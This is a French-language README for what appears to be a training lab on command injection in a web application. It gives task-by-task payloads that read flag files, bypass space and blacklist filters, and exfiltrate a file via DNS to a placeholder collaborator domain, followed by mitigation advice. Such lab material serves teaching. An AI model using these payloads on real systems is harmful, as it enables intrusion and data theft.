# 0x09 - Command Injection

## Description
Ce projet couvre l'exploitation de vulnérabilités de type Command Injection dans une application web orientée découverte d'actifs.

Le principe est simple: une entrée utilisateur est intégrée à une commande système sans protection suffisante, ce qui permet d'exécuter des commandes arbitraires.

## Objectifs
- Identifier un paramètre injectable.
- Exploiter une injection de commande simple.
- Contourner des filtres basiques (espaces, blacklist de commandes, caractères bloqués).
- Traiter un cas de blind command injection (pas de sortie directe).
- Comprendre les impacts et appliquer les bonnes pratiques de mitigation.

## Méthodologie
1. Relever la requête HTTP émise par le formulaire (Burp ou `curl -v`).
2. Identifier le paramètre contrôlé par l'utilisateur (`domain`, `host`, `target`, etc.).
3. Tester des séparateurs de commande: `;`, `&&`, `|`, retour ligne.
4. Vérifier l'exécution avec une commande simple (`id`, `whoami`, `pwd`).
5. Lire les flags selon les protections en place.

## Exemples d'exploitation par task

### Task 0 - Injection basique
Objectif typique: lire `/0-flag.txt`.

Payload exemple:
```bash
127.0.0.1; cat /0-flag.txt
```

### Task 1 - Bypass espace / blacklist
Objectif typique: lire `/etc/1-flag.txt`.

Payloads courants:
```bash
127.0.0.1;cat${IFS}/etc/1-flag.txt
127.0.0.1%0Ac\at%09/etc/1-flag.txt
```

### Task 2 - Bypass plus strict
Objectif typique: lire `/var/2-flag.txt` avec contraintes supplémentaires.

Exemples:
```bash
127.0.0.1;cat${IFS}$(printf${IFS}/var/2-flag.txt)
127.0.0.1;cat${IFS}${HOME:0:1}var${HOME:0:1}2-flag.txt
```

### Task 3 - Blind command injection
Objectif typique: récupérer `/var/www/3-flag.txt` sans sortie visible dans la réponse.

Approche: exfiltration DNS/HTTP vers un serveur contrôlé.

Exemple DNS:
```bash
127.0.0.1;nslookup $(cat /var/www/3-flag.txt).<collaborator-domain>
```

### Task 4 - Injection via outil système (ex: nmap)
Objectif typique: lire `/bin/4-flag.txt`.

Payload exemple:
```bash
127.0.0.1; cat /bin/4-flag.txt
```

## Bonnes pratiques de défense
- Ne jamais concaténer directement l'entrée utilisateur dans une commande shell.
- Utiliser des APIs sûres sans shell (`subprocess.run([...], shell=False)` par exemple).
- Mettre en place une allowlist stricte des formats attendus (IP, nom de domaine).
- Échapper correctement les arguments si une commande externe est indispensable.
- Exécuter le service avec les privilèges minimum.
- Journaliser et monitorer les comportements anormaux.

## Structure du dossier
Fichiers généralement attendus:
- `0-flag.txt`
- `1-flag.txt`
- `2-flag.txt`
- `3-flag.txt`
- `4-flag.txt`
- `README.md`

## Repo
- GitHub repository: `holbertonschool-cyber_security`
- Directory: `web_application_security/0x09_command_injection`
